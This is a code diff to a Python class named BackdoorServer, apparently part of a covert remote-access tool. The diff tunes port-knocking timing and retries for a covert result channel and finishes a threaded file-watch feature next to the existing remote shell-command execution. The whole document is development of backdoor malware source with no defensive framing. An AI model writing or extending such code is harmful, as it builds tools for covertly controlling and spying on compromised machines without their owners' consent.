@@ -77,6 +77,7 @@ class BackdoorServer(object):
         """Knock on ports decided by user"""
         for port in KNOCKED_PORTS:
             send(IP(dst=self.client)/TCP(dport=port),verbose=0)
+            time.sleep(0.2)
         
 
     def recv_command(self):
@@ -125,7 +126,6 @@ class BackdoorServer(object):
             self.send_result(result)
             queue.task_done()
 
-
     def send_result(self, result):
         """Sends the results of a command execution to the client.
 
@@ -133,8 +133,8 @@ class BackdoorServer(object):
         result - A Result object containing the command's result.
         """
 
-        retry_count = 5
-        knock_wait_time = 3
+        retry_count = 1
+        knock_wait_time = 1
         sock_timeout = 1
 
         covert_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -232,6 +232,8 @@ class BackdoorServer(object):
             result_send.setDaemon(True)
             result_send.start()
             
+            running_watch_command = None
+
             print("Client connected: {}".format(self.client))
             while True:
                 try:
@@ -239,6 +241,9 @@ class BackdoorServer(object):
                     if not cmd:
                         print("{} disconnected.".format(self.client))
                         self.client = None
+                        if running_watch_command:
+                            running_watch_command.stop()
+
                         break
 
                     print(str(cmd))
@@ -246,13 +251,16 @@ class BackdoorServer(object):
                     if cmd.type == command.Command.SHELL:
                         cmd.run(queue)
                     elif cmd.type == command.Command.WATCH:
-                        # TODO: Create a thread to handle the watch results if there's not already one
-                        # if there is already one, print a warning and do nothing
-                        # 
-                        # file_watch = Thread(target=cmd.run, args=(queue,))
-                        # file_watch.setDaemon(True)
-                        # file_watch.start()
-                        pass
+                        if running_watch_command:
+                            print("Watch command is already running. Ignoring additional watch.")
+                        else:
+                            running_watch_command = command.WatchCommand.from_bytes(cmd.to_bytes())
+                            def run_watch(queue):
+                                running_watch_command.run(queue)
+
+                            file_watch = Thread(target=run_watch, args=(queue,))
+                            file_watch.setDaemon(True)
+                            file_watch.start()
 
                 except KeyboardInterrupt:
                     print("see ya")
